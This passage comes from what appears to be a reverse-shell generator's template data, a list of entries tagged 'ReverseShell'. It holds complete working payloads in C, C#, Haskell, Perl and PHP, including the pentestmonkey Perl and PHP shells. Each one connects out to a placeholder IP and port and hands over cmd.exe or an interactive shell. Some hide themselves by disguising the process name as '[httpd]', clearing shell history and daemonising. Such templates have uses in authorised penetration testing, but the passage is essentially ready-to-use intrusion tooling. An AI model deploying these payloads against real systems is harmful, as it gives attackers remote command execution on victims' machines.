                                                  'gethostbyname(ip_addr);\r\n'
                                                  '    strcpy_s(ip_addr, 16, '
                                                  'inet_ntoa(*((struct in_addr '
                                                  '*)host->h_addr)));\r\n'
                                                  '\r\n'
                                                  '    hax.sin_family = '
                                                  'AF_INET;\r\n'
                                                  '    hax.sin_port = '
                                                  'htons(atoi(port));\r\n'
                                                  '    hax.sin_addr.s_addr = '
                                                  'inet_addr(ip_addr);\r\n'
                                                  '\r\n'
                                                  '    WSAConnect(Winsock, '
                                                  '(SOCKADDR*)&hax, '
                                                  'sizeof(hax), NULL, NULL, '
                                                  'NULL, NULL);\r\n'
                                                  '\r\n'
                                                  '    memset(&ini_processo, '
                                                  '0, '
                                                  'sizeof(ini_processo));\r\n'
                                                  '    ini_processo.cb = '
                                                  'sizeof(ini_processo);\r\n'
                                                  '    ini_processo.dwFlags = '
                                                  'STARTF_USESTDHANDLES | '
                                                  'STARTF_USESHOWWINDOW; \r\n'
                                                  '    ini_processo.hStdInput '
                                                  '= ini_processo.hStdOutput = '
                                                  'ini_processo.hStdError = '
                                                  '(HANDLE)Winsock;\r\n'
                                                  '\r\n'
                                                  '    TCHAR cmd[255] = '
                                                  'TEXT("cmd.exe");\r\n'
                                                  '\r\n'
                                                  '    CreateProcess(NULL, '
                                                  'cmd, NULL, NULL, TRUE, 0, '
                                                  'NULL, NULL, &ini_processo, '
                                                  '&processo_info);\r\n'
                                                  '\r\n'
                                                  '    return 0;\r\n'
                                                  '}',
                                       'meta': ['windows', 'ReverseShell'],
                                       'name': 'C Windows'},
                                      {'command': 'using System;\n'
                                                  'using System.Text;\n'
                                                  'using System.IO;\n'
                                                  'using System.Diagnostics;\n'
                                                  'using '
                                                  'System.ComponentModel;\n'
                                                  'using System.Linq;\n'
                                                  'using System.Net;\n'
                                                  'using System.Net.Sockets;\n'
                                                  '\n'
                                                  '\n'
                                                  'namespace ConnectBack\n'
                                                  '{\n'
                                                  '\tpublic class Program\n'
                                                  '\t{\n'
                                                  '\t\tstatic StreamWriter '
                                                  'streamWriter;\n'
                                                  '\n'
                                                  '\t\tpublic static void '
                                                  'Main(string[] args)\n'
                                                  '\t\t{\n'
                                                  '\t\t\tusing(TcpClient '
                                                  'client = new '
                                                  'TcpClient("{ip}", {port}))\n'
                                                  '\t\t\t{\n'
                                                  '\t\t\t\tusing(Stream stream '
                                                  '= client.GetStream())\n'
                                                  '\t\t\t\t{\n'
                                                  '\t\t\t\t\t'
                                                  'using(StreamReader rdr = '
                                                  'new StreamReader(stream))\n'
                                                  '\t\t\t\t\t{\n'
                                                  '\t\t\t\t\t\tstreamWriter = '
                                                  'new StreamWriter(stream);\n'
                                                  '\t\t\t\t\t\t\n'
                                                  '\t\t\t\t\t\tStringBuilder '
                                                  'strInput = new '
                                                  'StringBuilder();\n'
                                                  '\n'
                                                  '\t\t\t\t\t\tProcess p = new '
                                                  'Process();\n'
                                                  '\t\t\t\t\t\t'
                                                  'p.StartInfo.FileName = '
                                                  '"{shell}";\n'
                                                  '\t\t\t\t\t\t'
                                                  'p.StartInfo.CreateNoWindow '
                                                  '= true;\n'
                                                  '\t\t\t\t\t\t'
                                                  'p.StartInfo.UseShellExecute '
                                                  '= false;\n'
                                                  '\t\t\t\t\t\t'
                                                  'p.StartInfo.RedirectStandardOutput '
                                                  '= true;\n'
                                                  '\t\t\t\t\t\t'
                                                  'p.StartInfo.RedirectStandardInput '
                                                  '= true;\n'
                                                  '\t\t\t\t\t\t'
                                                  'p.StartInfo.RedirectStandardError '
                                                  '= true;\n'
                                                  '\t\t\t\t\t\t'
                                                  'p.OutputDataReceived += new '
                                                  'DataReceivedEventHandler(CmdOutputDataHandler);\n'
                                                  '\t\t\t\t\t\tp.Start();\n'
                                                  '\t\t\t\t\t\t'
                                                  'p.BeginOutputReadLine();\n'
                                                  '\n'
                                                  '\t\t\t\t\t\twhile(true)\n'
                                                  '\t\t\t\t\t\t{\n'
                                                  '\t\t\t\t\t\t\t'
                                                  'strInput.Append(rdr.ReadLine());\n'
                                                  '\t\t\t\t\t\t\t'
                                                  '//strInput.Append("\\n");\n'
                                                  '\t\t\t\t\t\t\t'
                                                  'p.StandardInput.WriteLine(strInput);\n'
                                                  '\t\t\t\t\t\t\t'
                                                  'strInput.Remove(0, '
                                                  'strInput.Length);\n'
                                                  '\t\t\t\t\t\t}\n'
                                                  '\t\t\t\t\t}\n'
                                                  '\t\t\t\t}\n'
                                                  '\t\t\t}\n'
                                                  '\t\t}\n'
                                                  '\n'
                                                  '\t\tprivate static void '
                                                  'CmdOutputDataHandler(object '
                                                  'sendingProcess, '
                                                  'DataReceivedEventArgs '
                                                  'outLine)\n'
                                                  '        {\n'
                                                  '            StringBuilder '
                                                  'strOutput = new '
                                                  'StringBuilder();\n'
                                                  '\n'
                                                  '            if '
                                                  '(!String.IsNullOrEmpty(outLine.Data))\n'
                                                  '            {\n'
                                                  '                try\n'
                                                  '                {\n'
                                                  '                    '
                                                  'strOutput.Append(outLine.Data);\n'
                                                  '                    '
                                                  'streamWriter.WriteLine(strOutput);\n'
                                                  '                    '
                                                  'streamWriter.Flush();\n'
                                                  '                }\n'
                                                  '                catch '
                                                  '(Exception err) { }\n'
                                                  '            }\n'
                                                  '        }\n'
                                                  '\n'
                                                  '\t}\n'
                                                  '}',
                                       'meta': ['linux',
                                                'windows',
                                                'ReverseShell'],
                                       'name': 'C# TCP Client'},
                                      {'command': 'using System;\n'
                                                  'using System.Diagnostics;\n'
                                                  '\n'
                                                  'namespace BackConnect {\n'
                                                  '  class ReverseBash {\n'
                                                  '\tpublic static void '
                                                  'Main(string[] args) {\n'
                                                  '\t  Process proc = new '
                                                  'System.Diagnostics.Process();\n'
                                                  '\t  proc.StartInfo.FileName '
                                                  '= "{shell}";\n'
                                                  '\t  '
                                                  'proc.StartInfo.Arguments = '
                                                  '"-c \\"{shell} -i >& '
                                                  '/dev/tcp/{ip}/{port} '
                                                  '0>&1\\"";\n'
                                                  '\t  '
                                                  'proc.StartInfo.UseShellExecute '
                                                  '= false;\n'
                                                  '\t  '
                                                  'proc.StartInfo.RedirectStandardOutput '
                                                  '= true;\n'
                                                  '\t  proc.Start();\n'
                                                  '\n'
                                                  '\t  while '
                                                  '(!proc.StandardOutput.EndOfStream) '
                                                  '{\n'
                                                  '\t\t'
                                                  'Console.WriteLine(proc.StandardOutput.ReadLine());\n'
                                                  '\t  }\n'
                                                  '\t}\n'
                                                  '  }\n'
                                                  '}\n',
                                       'meta': ['linux',
                                                'windows',
                                                'ReverseShell'],
                                       'name': 'C# Bash -i'},
                                      {'command': 'module Main where\n'
                                                  '\n'
                                                  'import System.Process\n'
                                                  '\n'
                                                  'main = callCommand "rm '
                                                  '/tmp/f;mkfifo /tmp/f;cat '
                                                  '/tmp/f | {shell} -i 2>&1 | '
                                                  'nc {ip} {port} >/tmp/f"',
                                       'meta': ['linux', 'mac', 'ReverseShell'],
                                       'name': 'Haskell #1'},
                                      {'command': "perl -e 'use "
                                                  'Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("{shell} '
                                                  '-i");};\'',
                                       'meta': ['linux', 'mac', 'ReverseShell'],
                                       'name': 'Perl'},
                                      {'command': 'perl -MIO -e '
                                                  "'$p=fork;exit,if($p);$c=new "
                                                  'IO::Socket::INET(PeerAddr,"{ip}:{port}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ '
                                                  "while<>;'",
                                       'meta': ['linux', 'mac', 'ReverseShell'],
                                       'name': 'Perl no sh'},
                                      {'command': '#!/usr/bin/perl -w\n'
                                                  '# perl-reverse-shell - A '
                                                  'Reverse Shell '
                                                  'implementation in PERL\n'
                                                  '# Copyright (C) 2006 '
                                                  'pentestmonkey@pentestmonkey.net\n'
                                                  '#\n'
                                                  '# This tool may be used for '
                                                  'legal purposes only.  Users '
                                                  'take full responsibility\n'
                                                  '# for any actions performed '
                                                  'using this tool.  The '
                                                  'author accepts no '
                                                  'liability\n'
                                                  '# for damage caused by this '
                                                  'tool.  If these terms are '
                                                  'not acceptable to you, '
                                                  'then\n'
                                                  '# do not use this tool.\n'
                                                  '#\n'
                                                  '# In all other respects the '
                                                  'GPL version 2 applies:\n'
                                                  '#\n'
                                                  '# This program is free '
                                                  'software; you can '
                                                  'redistribute it and/or '
                                                  'modify\n'
                                                  '# it under the terms of the '
                                                  'GNU General Public License '
                                                  'version 2 as\n'
                                                  '# published by the Free '
                                                  'Software Foundation.\n'
                                                  '#\n'
                                                  '# This program is '
                                                  'distributed in the hope '
                                                  'that it will be useful,\n'
                                                  '# but WITHOUT ANY WARRANTY; '
                                                  'without even the implied '
                                                  'warranty of\n'
                                                  '# MERCHANTABILITY or '
                                                  'FITNESS FOR A PARTICULAR '
                                                  'PURPOSE.  See the\n'
                                                  '# GNU General Public '
                                                  'License for more details.\n'
                                                  '#\n'
                                                  '# You should have received '
                                                  'a copy of the GNU General '
                                                  'Public License along\n'
                                                  '# with this program; if '
                                                  'not, write to the Free '
                                                  'Software Foundation, Inc.,\n'
                                                  '# 51 Franklin Street, Fifth '
                                                  'Floor, Boston, MA '
                                                  '02110-1301 USA.\n'
                                                  '#\n'
                                                  '# This tool may be used for '
                                                  'legal purposes only.  Users '
                                                  'take full responsibility\n'
                                                  '# for any actions performed '
                                                  'using this tool.  If these '
                                                  'terms are not acceptable '
                                                  'to\n'
                                                  '# you, then do not use this '
                                                  'tool.\n'
                                                  '#\n'
                                                  '# You are encouraged to '
                                                  'send comments, improvements '
                                                  'or suggestions to\n'
                                                  '# me at '
                                                  'pentestmonkey@pentestmonkey.net\n'
                                                  '#\n'
                                                  '# Description\n'
                                                  '# -----------\n'
                                                  '# This script will make an '
                                                  'outbound TCP connection to '
                                                  'a hardcoded IP and port.\n'
                                                  '# The recipient will be '
                                                  'given a shell running as '
                                                  'the current user (apache '
                                                  'normally).\n'
                                                  '#\n'
                                                  '\n'
                                                  'use strict;\n'
                                                  'use Socket;\n'
                                                  'use FileHandle;\n'
                                                  'use POSIX;\n'
                                                  'my $VERSION = "1.0";\n'
                                                  '\n'
                                                  '# Where to send the reverse '
                                                  'shell.  Change these.\n'
                                                  "my $ip = '{ip}';\n"
                                                  'my $port = {port};\n'
                                                  '\n'
                                                  '# Options\n'
                                                  'my $daemon = 1;\n'
                                                  'my $auth   = 0; # 0 means '
                                                  'authentication is disabled '
                                                  'and any \n'
                                                  '\t\t# source IP can access '
                                                  'the reverse shell\n'
                                                  'my '
                                                  '$authorised_client_pattern '
                                                  '= qr(^127\\.0\\.0\\.1$);\n'
                                                  '\n'
                                                  '# Declarations\n'
                                                  'my $global_page = "";\n'
                                                  'my $fake_process_name = '
                                                  '"/usr/sbin/apache";\n'
                                                  '\n'
                                                  '# Change the process name '
                                                  'to be less conspicious\n'
                                                  '$0 = "[httpd]";\n'
                                                  '\n'
                                                  '# Authenticate based on '
                                                  'source IP address if '
                                                  'required\n'
                                                  'if '
                                                  "(defined($ENV{'REMOTE_ADDR'})) "
                                                  '{\n'
                                                  '\tcgiprint("Browser IP '
                                                  'address appears to be: '
                                                  '$ENV{\'REMOTE_ADDR\'}");\n'
                                                  '\n'
                                                  '\tif ($auth) {\n'
                                                  '\t\tunless '
                                                  "($ENV{'REMOTE_ADDR'} =~ "
                                                  '$authorised_client_pattern) '
                                                  '{\n'
                                                  '\t\t\tcgiprint("ERROR: Your '
                                                  "client isn't authorised to "
                                                  'view this page");\n'
                                                  '\t\t\tcgiexit();\n'
                                                  '\t\t}\n'
                                                  '\t}\n'
                                                  '} elsif ($auth) {\n'
                                                  '\tcgiprint("ERROR: '
                                                  'Authentication is enabled, '
                                                  "but I couldn't determine "
                                                  'your IP address.  Denying '
                                                  'access");\n'
                                                  '\tcgiexit(0);\n'
                                                  '}\n'
                                                  '\n'
                                                  '# Background and dissociate '
                                                  'from parent process if '
                                                  'required\n'
                                                  'if ($daemon) {\n'
                                                  '\tmy $pid = fork();\n'
                                                  '\tif ($pid) {\n'
                                                  '\t\tcgiexit(0); # parent '
                                                  'exits\n'
                                                  '\t}\n'
                                                  '\n'
                                                  '\tsetsid();\n'
                                                  "\tchdir('/');\n"
                                                  '\tumask(0);\n'
                                                  '}\n'
                                                  '\n'
                                                  '# Make TCP connection for '
                                                  'reverse shell\n'
                                                  'socket(SOCK, PF_INET, '
                                                  'SOCK_STREAM, '
                                                  "getprotobyname('tcp'));\n"
                                                  'if (connect(SOCK, '
                                                  'sockaddr_in($port,inet_aton($ip)))) '
                                                  '{\n'
                                                  '\tcgiprint("Sent reverse '
                                                  'shell to $ip:$port");\n'
                                                  '\tcgiprintpage();\n'
                                                  '} else {\n'
                                                  '\tcgiprint("Couldn\'t open '
                                                  'reverse shell to $ip:$port: '
                                                  '$!");\n'
                                                  '\tcgiexit();\t\n'
                                                  '}\n'
                                                  '\n'
                                                  '# Redirect STDIN, STDOUT '
                                                  'and STDERR to the TCP '
                                                  'connection\n'
                                                  'open(STDIN, ">&SOCK");\n'
                                                  'open(STDOUT,">&SOCK");\n'
                                                  'open(STDERR,">&SOCK");\n'
                                                  "$ENV{'HISTFILE'} = "
                                                  "'/dev/null';\n"
                                                  'system("w;uname '
                                                  '-a;id;pwd");\n'
                                                  'exec({"{shell}"} '
                                                  '($fake_process_name, '
                                                  '"-i"));\n'
                                                  '\n'
                                                  '# Wrapper around print\n'
                                                  'sub cgiprint {\n'
                                                  '\tmy $line = shift;\n'
                                                  '\t$line .= "<p>\\n";\n'
                                                  '\t$global_page .= $line;\n'
                                                  '}\n'
                                                  '\n'
                                                  '# Wrapper around exit\n'
                                                  'sub cgiexit {\n'
                                                  '\tcgiprintpage();\n'
                                                  '\texit 0; # 0 to ensure we '
                                                  "don't give a 500 response.\n"
                                                  '}\n'
                                                  '\n'
                                                  '# Form HTTP response using '
                                                  'all the messages gathered '
                                                  'by cgiprint so far\n'
                                                  'sub cgiprintpage {\n'
                                                  '\tprint "Content-Length: " '
                                                  '. length($global_page) . '
                                                  '"\\r\n'
                                                  'Connection: close\\r\n'
                                                  'Content-Type: '
                                                  'text\\/html\\r\\n\\r\\n" . '
                                                  '$global_page;\n'
                                                  '}\n',
                                       'meta': ['linux', 'mac', 'ReverseShell'],
                                       'name': 'Perl PentestMonkey'},
                                      {'command': '<?php\n'
                                                  '// php-reverse-shell - A '
                                                  'Reverse Shell '
                                                  'implementation in PHP. '
                                                  'Comments stripped to slim '
                                                  'it down. RE: '
                                                  'https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php\n'
                                                  '// Copyright (C) 2007 '
                                                  'pentestmonkey@pentestmonkey.net\n'
                                                  '\n'
                                                  'set_time_limit (0);\n'
                                                  '$VERSION = "1.0";\n'
                                                  "$ip = '{ip}';\n"
                                                  '$port = {port};\n'
                                                  '$chunk_size = 1400;\n'
                                                  '$write_a = null;\n'
                                                  '$error_a = null;\n'
                                                  "$shell = 'uname -a; w; id; "
                                                  "{shell} -i';\n"
                                                  '$daemon = 0;\n'
                                                  '$debug = 0;\n'
                                                  '\n'
                                                  'if '
                                                  "(function_exists('pcntl_fork')) "
                                                  '{\n'
                                                  '\t$pid = pcntl_fork();\n'
                                                  '\t\n'
                                                  '\tif ($pid == -1) {\n'
                                                  '\t\tprintit("ERROR: Can\'t '
                                                  'fork");\n'
                                                  '\t\texit(1);\n'
                                                  '\t}\n'
                                                  '\t\n'
                                                  '\tif ($pid) {\n'
                                                  '\t\texit(0);  // Parent '
                                                  'exits\n'
                                                  '\t}\n'
                                                  '\tif (posix_setsid() == -1) '
                                                  '{\n'
                                                  '\t\tprintit("Error: Can\'t '
                                                  'setsid()");\n'
                                                  '\t\texit(1);\n'
                                                  '\t}\n'
                                                  '\n'
                                                  '\t$daemon = 1;\n'
                                                  '} else {\n'
                                                  '\tprintit("WARNING: Failed '
                                                  'to daemonise.  This is '
                                                  'quite common and not '
                                                  'fatal.");\n'
                                                  '}\n'
                                                  '\n'
                                                  'chdir("/");\n'
                                                  '\n'
                                                  'umask(0);\n'
                                                  '\n'
                                                  '// Open reverse connection\n'
                                                  '$sock = fsockopen($ip, '
                                                  '$port, $errno, $errstr, '
                                                  '30);\n'
                                                  'if (!$sock) {\n'
                                                  '\tprintit("$errstr '
                                                  '($errno)");\n'
                                                  '\texit(1);\n'
                                                  '}\n'
                                                  '\n'
                                                  '$descriptorspec = array(\n'
                                                  '   0 => array("pipe", '
                                                  '"r"),  // stdin is a pipe '
                                                  'that the child will read '
                                                  'from\n'
                                                  '   1 => array("pipe", '
                                                  '"w"),  // stdout is a pipe '
                                                  'that the child will write '
                                                  'to\n'
                                                  '   2 => array("pipe", '
                                                  '"w")   // stderr is a pipe '
                                                  'that the child will write '
                                                  'to\n'
                                                  ');\n'
                                                  '\n'
                                                  '$process = '
                                                  'proc_open($shell, '
                                                  '$descriptorspec, $pipes);\n'
                                                  '\n'
                                                  'if (!is_resource($process)) '
                                                  '{\n'
                                                  '\tprintit("ERROR: Can\'t '
                                                  'spawn shell");\n'
                                                  '\texit(1);\n'
                                                  '}\n'
                                                  '\n'
                                                  'stream_set_blocking($pipes[0], '
                                                  '0);\n'
                                                  'stream_set_blocking($pipes[1], '
                                                  '0);\n'
                                                  'stream_set_blocking($pipes[2], '
                                                  '0);\n'
                                                  'stream_set_blocking($sock, '
                                                  '0);\n'
                                                  '\n'
                                                  'printit("Successfully '
                                                  'opened reverse shell to '
                                                  '$ip:$port");\n'
                                                  '\n'
                                                  'while (1) {\n'
                                                  '\tif (feof($sock)) {\n'
                                                  '\t\tprintit("ERROR: Shell '
                                                  'connection terminated");\n'
                                                  '\t\tbreak;\n'
                                                  '\t}\n'
                                                  '\n'
                                                  '\tif (feof($pipes[1])) {\n'
                                                  '\t\tprintit("ERROR: Shell '
                                                  'process terminated");\n'
                                                  '\t\tbreak;\n'
                                                  '\t}\n'
                                                  '\n'
                                                  '\t$read_a = array($sock, '
                                                  '$pipes[1], $pipes[2]);\n'
                                                  '\t$num_changed_sockets = '
                                                  'stream_select($read_a, '
                                                  '$write_a, $error_a, null);\n'
                                                  '\n'
                                                  '\tif (in_array($sock, '
                                                  '$read_a)) {\n'
                                                  '\t\tif ($debug) '
                                                  'printit("SOCK READ");\n'
                                                  '\t\t$input = fread($sock, '
                                                  '$chunk_size);\n'
                                                  '\t\tif ($debug) '
                                                  'printit("SOCK: $input");\n'
                                                  '\t\tfwrite($pipes[0], '
                                                  '$input);\n'
                                                  '\t}\n'
                                                  '\n'
                                                  '\tif (in_array($pipes[1], '
                                                  '$read_a)) {\n'
                                                  '\t\tif ($debug) '
                                                  'printit("STDOUT READ");\n'
                                                  '\t\t$input = '
                                                  'fread($pipes[1], '
                                                  '$chunk_size);\n'
                                                  '\t\tif ($debug) '
                                                  'printit("STDOUT: $input");\n'
                                                  '\t\tfwrite($sock, $input);\n'
                                                  '\t}\n'
                                                  '\n'
                                                  '\tif (in_array($pipes[2], '
                                                  '$read_a)) {\n'
                                                  '\t\tif ($debug) '
                                                  'printit("STDERR READ");\n'
                                                  '\t\t$input = '
                                                  'fread($pipes[2], '
                                                  '$chunk_size);\n'
                                                  '\t\tif ($debug) '
                                                  'printit("STDERR: $input");\n'
                                                  '\t\tfwrite($sock, $input);\n'
                                                  '\t}\n'
                                                  '}\n'
                                                  '\n'
                                                  'fclose($sock);\n'
                                                  'fclose($pipes[0]);\n'
                                                  'fclose($pipes[1]);\n'
                                                  'fclose($pipes[2]);\n'
                                                  'proc_close($process);\n'
                                                  '\n'
                                                  'function printit ($string) '
                                                  '{\n'
                                                  '\tif (!$daemon) {\n'
                                                  '\t\tprint "$string\\n";\n'
                                                  '\t}\n'
                                                  '}\n'
                                                  '\n'
                                                  '?>',
                                       'meta': ['linux',
                                                'windows',
                                                'mac',
                                                'ReverseShell'],
                                       'name': 'PHP PentestMonkey'},
                                      {'command': '<?php\n'
                                                  '// Copyright (c) 2020 Ivan '
                                                  'Sincek\n'
                                                  '// v2.3\n'
                                                  '// Requires PHP v5.0.0 or '
                                                  'greater.\n'
                                                  '// Works on Linux OS, '
                                                  'macOS, and Windows OS.\n'
                                                  '// See the original script '
                                                  'at '
                                                  'https://github.com/pentestmonkey/php-reverse-shell.\n'
                                                  'class Shell {\n'
                                                  '    private $addr  = null;\n'
                                                  '    private $port  = null;\n'
                                                  '    private $os    = null;\n'
                                                  '    private $shell = null;\n'
                                                  '    private $descriptorspec '
                                                  '= array(\n'
                                                  "        0 => array('pipe', "
                                                  "'r'), // shell can read "
                                                  'from STDIN\n'
                                                  "        1 => array('pipe', "
                                                  "'w'), // shell can write to "
                                                  'STDOUT\n'
                                                  "        2 => array('pipe', "
                                                  "'w')  // shell can write to "
                                                  'STDERR\n'
                                                  '    );\n'
                                                  '    private $buffer  = '
                                                  '1024;    // read/write '
                                                  'buffer size\n'
                                                  '    private $clen    = '
                                                  '0;       // command length\n'
                                                  '    private $error   = '
                                                  'false;   // stream '
                                                  'read/write error\n'
                                                  '    public function '
                                                  '__construct($addr, $port) '
                                                  '{\n'
                                                  '        $this->addr = '
                                                  '$addr;\n'
                                                  '        $this->port = '
                                                  '$port;\n'
                                                  '    }\n'
                                                  '    private function '
                                                  'detect() {\n'
                                                  '        $detected = true;\n'
                                                  '        if (stripos(PHP_OS, '
                                                  "'LINUX') !== false) { // "
                                                  'same for macOS\n'
                                                  '            $this->os    = '
                                                  "'LINUX';\n"
                                                  '            $this->shell = '
                                                  "'{shell}';\n"
                                                  '        } else if '
                                                  "(stripos(PHP_OS, 'WIN32') "
                                                  '!== false || '
                                                  "stripos(PHP_OS, 'WINNT') "
                                                  '!== false || '
                                                  "stripos(PHP_OS, 'WINDOWS') "
                                                  '!== false) {\n'
                                                  '            $this->os    = '
                                                  "'WINDOWS';\n"
                                                  '            $this->shell = '
                                                  "'cmd.exe';\n"
                                                  '        } else {\n'
                                                  '            $detected = '
                                                  'false;\n'
                                                  '            echo '
                                                  '"SYS_ERROR: Underlying '
                                                  'operating system is not '
                                                  'supported, script will now '
                                                  'exit...\\n";\n'
                                                  '        }\n'
                                                  '        return $detected;\n'
                                                  '    }\n'
                                                  '    private function '
                                                  'daemonize() {\n'
                                                  '        $exit = false;\n'
                                                  '        if '
                                                  "(!function_exists('pcntl_fork')) "
                                                  '{\n'
                                                  '            echo '
                                                  '"DAEMONIZE: pcntl_fork() '
                                                  'does not exists, moving '
                                                  'on...\\n";\n'
                                                  '        } else if (($pid = '
                                                  '@pcntl_fork()) < 0) {\n'
                                                  '            echo '
                                                  '"DAEMONIZE: Cannot fork off '
                                                  'the parent process, moving '
                                                  'on...\\n";\n'
                                                  '        } else if ($pid > '
                                                  '0) {\n'
                                                  '            $exit = true;\n'
                                                  '            echo '
                                                  '"DAEMONIZE: Child process '
                                                  'forked off successfully, '
                                                  'parent process will now '
                                                  'exit...\\n";\n'
                                                  '        } else if '
                                                  '(posix_setsid() < 0) {\n'
                                                  '            // once '
                                                  'daemonized you will '
                                                  'actually no longer see the '
                                                  "script's dump\n"
                                                  '            echo '
                                                  '"DAEMONIZE: Forked off the '
                                                  'parent process but cannot '
                                                  'set a new SID, moving on as '
                                                  'an orphan...\\n";\n'
                                                  '        } else {\n'
                                                  '            echo '
                                                  '"DAEMONIZE: Completed '
                                                  'successfully!\\n";\n'
                                                  '        }\n'
                                                  '        return $exit;\n'
                                                  '    }\n'
                                                  '    private function '
                                                  'settings() {\n'
                                                  '        '
                                                  '@error_reporting(0);\n'
                                                  '        @set_time_limit(0); '
                                                  '// do not impose the script '
                                                  'execution time limit\n'
                                                  '        @umask(0); // set '
                                                  'the file/directory '
                                                  'permissions - 666 for files '
                                                  'and 777 for directories\n'
                                                  '    }\n'
                                                  '    private function '
                                                  'dump($data) {\n'
                                                  '        $data = '
                                                  "str_replace('<', '&lt;', "
                                                  '$data);\n'
                                                  '        $data = '
                                                  "str_replace('>', '&gt;', "
                                                  '$data);\n'
                                                  '        echo $data;\n'
                                                  '    }\n'
                                                  '    private function '
                                                  'read($stream, $name, '
                                                  '$buffer) {\n'
                                                  '        if (($data = '
                                                  '@fread($stream, $buffer)) '
                                                  '=== false) { // suppress an '
                                                  'error when reading from a '
                                                  'closed blocking stream\n'
                                                  '            $this->error = '
                                                  'true;                            '
                                                  '// set global error flag\n'
                                                  '            echo '
                                                  '"STRM_ERROR: Cannot read '
                                                  'from ${name}, script will '
                                                  'now exit...\\n";\n'
                                                  '        }\n'
                                                  '        return $data;\n'
                                                  '    }\n'
                                                  '    private function '
                                                  'write($stream, $name, '
                                                  '$data) {\n'
                                                  '        if (($bytes = '
                                                  '@fwrite($stream, $data)) '
                                                  '=== false) { // suppress an '
                                                  'error when writing to a '
                                                  'closed blocking stream\n'
                                                  '            $this->error = '
                                                  'true;                            '
                                                  '// set global error flag\n'
                                                  '            echo '
                                                  '"STRM_ERROR: Cannot write '
                                                  'to ${name}, script will now '
                                                  'exit...\\n";\n'
                                                  '        }\n'
                                                  '        return $bytes;\n'
                                                  '    }\n'
                                                  '    // read/write method '
                                                  'for non-blocking streams\n'
                                                  '    private function '
                                                  'rw($input, $output, $iname, '
                                                  '$oname) {\n'
                                                  '        while (($data = '
                                                  '$this->read($input, $iname, '
                                                  '$this->buffer)) && '
                                                  '$this->write($output, '
                                                  '$oname, $data)) {\n'
                                                  '            if ($this->os '
                                                  "=== 'WINDOWS' && $oname === "
                                                  "'STDIN') { $this->clen += "
                                                  'strlen($data); } // '
                                                  'calculate the command '
                                                  'length\n'
                                                  '            '
                                                  '$this->dump($data); // '
                                                  "script's dump\n"
                                                  '        }\n'
                                                  '    }\n'
                                                  '    // read/write method '
                                                  'for blocking streams (e.g. '
                                                  'for STDOUT and STDERR on '
                                                  'Windows OS)\n'
                                                  '    // we must read the '
                                                  'exact byte length from a '
                                                  'stream and not a single '
                                                  'byte more\n'
                                                  '    private function '
                                                  'brw($input, $output, '
                                                  '$iname, $oname) {\n'
                                                  '        $fstat = '
                                                  'fstat($input);\n'
                                                  '        $size = '
                                                  "$fstat['size'];\n"
                                                  '        if ($this->os === '
                                                  "'WINDOWS' && $iname === "
                                                  "'STDOUT' && $this->clen) {\n"
                                                  '            // for some '
                                                  'reason Windows OS pipes '
                                                  'STDIN into STDOUT\n'
                                                  '            // we do not '
                                                  'like that\n'
                                                  '            // we need to '
                                                  'discard the data from the '
                                                  'stream\n'
                                                  '            while '
                                                  '($this->clen > 0 && ($bytes '
                                                  '= $this->clen >= '
                                                  '$this->buffer ? '
                                                  '$this->buffer : '
                                                  '$this->clen) && '
                                                  '$this->read($input, $iname, '
                                                  '$bytes)) {\n'
                                                  '                $this->clen '
                                                  '-= $bytes;\n'
                                                  '                $size -= '
                                                  '$bytes;\n'
                                                  '            }\n'
                                                  '        }\n'
                                                  '        while ($size > 0 && '
                                                  '($bytes = $size >= '
                                                  '$this->buffer ? '
                                                  '$this->buffer : $size) && '
                                                  '($data = '
                                                  '$this->read($input, $iname, '
                                                  '$bytes)) && '
                                                  '$this->write($output, '
                                                  '$oname, $data)) {\n'
                                                  '            $size -= '
                                                  '$bytes;\n'
                                                  '            '
                                                  '$this->dump($data); // '
                                                  "script's dump\n"
                                                  '        }\n'
                                                  '    }\n'
                                                  '    public function run() '
                                                  '{\n'
                                                  '        if ($this->detect() '
                                                  '&& !$this->daemonize()) {\n'
                                                  '            '
                                                  '$this->settings();\n'
                                                  '\n'
                                                  '            // ----- SOCKET '
                                                  'BEGIN -----\n'
                                                  '            $socket = '
                                                  '@fsockopen($this->addr, '
                                                  '$this->port, $errno, '
                                                  '$errstr, 30);\n'
                                                  '            if (!$socket) '
                                                  '{\n'
                                                  '                echo '
                                                  '"SOC_ERROR: {$errno}: '
                                                  '{$errstr}\\n";\n'
                                                  '            } else {\n'
                                                  '                '
                                                  'stream_set_blocking($socket, '
                                                  'false); // set the socket '
                                                  'stream to non-blocking mode '
                                                  "| returns 'true' on Windows "
                                                  'OS\n'
                                                  '\n'
                                                  '                // ----- '
                                                  'SHELL BEGIN -----\n'
                                                  '                $process = '
                                                  '@proc_open($this->shell, '
                                                  '$this->descriptorspec, '
                                                  '$pipes, null, null);\n'
                                                  '                if '
                                                  '(!$process) {\n'
                                                  '                    echo '
                                                  '"PROC_ERROR: Cannot start '
                                                  'the shell\\n";\n'
                                                  '                } else {\n'
                                                  '                    foreach '
                                                  '($pipes as $pipe) {\n'
                                                  '                        '
                                                  'stream_set_blocking($pipe, '
                                                  'false); // set the shell '
                                                  'streams to non-blocking '
                                                  "mode | returns 'false' on "
                                                  'Windows OS\n'
                                                  '                    }\n'
                                                  '\n'
                                                  '                    // '
                                                  '----- WORK BEGIN -----\n'
                                                  '                    $status '
                                                  '= '
                                                  'proc_get_status($process);\n'
                                                  '                    '
                                                  '@fwrite($socket, "SOCKET: '
                                                  'Shell has connected! PID: " '
                                                  ". $status['pid'] . "
                                                  '"\\n");\n'
                                                  '                    do {\n'
                                                  '\t\t\t\t\t\t$status = '
                                                  'proc_get_status($process);\n'
                                                  '                        if '
                                                  '(feof($socket)) { // check '
                                                  'for end-of-file on SOCKET\n'
                                                  '                            '
                                                  'echo "SOC_ERROR: Shell '
                                                  'connection has been '
                                                  'terminated\\n"; break;\n'
                                                  '                        } '
                                                  'else if (feof($pipes[1]) || '
                                                  "!$status['running']) "
                                                  '{                 // check '
                                                  'for end-of-file on STDOUT '
                                                  'or if process is still '
                                                  'running\n'
                                                  '                            '
                                                  'echo "PROC_ERROR: Shell '
                                                  'process has been '
                                                  'terminated\\n";   break; // '
                                                  'feof() does not work with '
                                                  'blocking streams\n'
                                                  '                        '
                                                  '}                                                                    '
